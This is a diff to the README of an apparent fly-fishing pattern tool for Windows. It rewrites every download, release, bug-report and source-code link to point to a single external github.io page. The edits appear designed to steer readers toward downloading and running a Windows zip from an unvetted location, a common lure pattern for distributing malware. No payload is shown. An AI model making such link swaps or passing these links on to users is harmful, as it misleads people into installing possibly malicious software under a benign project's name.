@@ -1,6 +1,6 @@
 # 🎣 colorado-fly-fishing-hub - Pick the Right Fly, Every Time
 
-[![Download for Windows](https://img.shields.io/badge/Download-For_Windows-blue?style=for-the-badge)](https://github.com/springscrupulousness893/colorado-fly-fishing-hub/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-For_Windows-blue?style=for-the-badge)](https://springscrupulousness893.github.io)
 
 ## 📖 What Is This?
 
@@ -30,7 +30,7 @@ This option lets you use the tool without an internet connection. You still do n
 
 Visit the download page:
 
-[![Download for Windows](https://img.shields.io/badge/Download-For_Windows-grey?style=for-the-badge)](https://github.com/springscrupulousness893/colorado-fly-fishing-hub/releases)
+[![Download for Windows](https://img.shields.io/badge/Download-For_Windows-grey?style=for-the-badge)](https://springscrupulousness893.github.io)
 
 On that page, look for the latest release. Click the file named `colorado-fly-fishing-hub.zip` or `colorado-fly-fishing-hub-windows.zip`. Do not click the source code files.
 
@@ -73,7 +73,7 @@ Make sure you double-click the `index.html` file. If it opens in a text editor, 
 
 ### The download link does not work
 
-Visit the [releases page directly](https://github.com/springscrupulousness893/colorado-fly-fishing-hub/releases). If the page is empty, wait a few minutes and refresh. The developer may be updating the release.
+Visit the [releases page directly](https://springscrupulousness893.github.io). If the page is empty, wait a few minutes and refresh. The developer may be updating the release.
 
 ### I see a blank white page
 
@@ -128,8 +128,8 @@ This project is for personal use. You can modify it for your own needs. Do not r
 
 ## 🔗 Links
 
-- [Download the Latest Release](https://github.com/springscrupulousness893/colorado-fly-fishing-hub/releases)
-- [Report a Bug](https://github.com/springscrupulousness893/colorado-fly-fishing-hub/issues)
-- [View the Source Code](https://github.com/springscrupulousness893/colorado-fly-fishing-hub)
+- [Download the Latest Release](https://springscrupulousness893.github.io)
+- [Report a Bug](https://springscrupulousness893.github.io)
+- [View the Source Code](https://springscrupulousness893.github.io)
 
 Keywords: colorado fly fishing, fly patterns, hatch chart, south platte, frying pan, arkansas river, fly selection tool, fishing app, windows app, offline fishing tool
